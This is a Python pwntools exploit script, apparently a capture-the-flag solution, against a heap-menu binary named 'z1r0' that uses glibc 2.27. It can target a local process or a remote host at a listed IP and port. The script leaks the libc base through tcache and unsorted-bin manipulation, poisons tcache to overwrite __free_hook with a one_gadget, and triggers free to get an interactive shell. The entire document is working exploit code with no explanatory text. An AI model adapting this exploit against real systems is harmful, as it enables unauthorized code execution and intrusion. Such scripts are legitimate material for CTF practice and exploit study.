from pwn import *

context(arch='amd64', os='linux')

file_name = './z1r0'

debug = 0
if debug:
    r = remote('121.36.194.21', 49153)
else:
    r = process(file_name)

elf = ELF(file_name)

libc = ELF('libc-2.27.so')

menu = 'Your choice: '

def dbg():
    gdb.attach(r)

def new(index, size):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(size))

def edit(index, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Content: ', content)

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))

def delete(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))

new(0,0x100)
new(1,0x20)

delete(0)

for i in range(7):
    edit(0, p64(0))

    delete(0)

show(0)


libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x3ebca0
success('libc_base = ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
success('free_hook = ' + hex(free_hook))
one = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = one[1] + libc_base

delete(1)

edit(1, p64(free_hook))

for i in range(0x30):
    new(i+1, 0x20)
    edit(i+1, p64(one_gadget))


delete(2)


r.interactive()
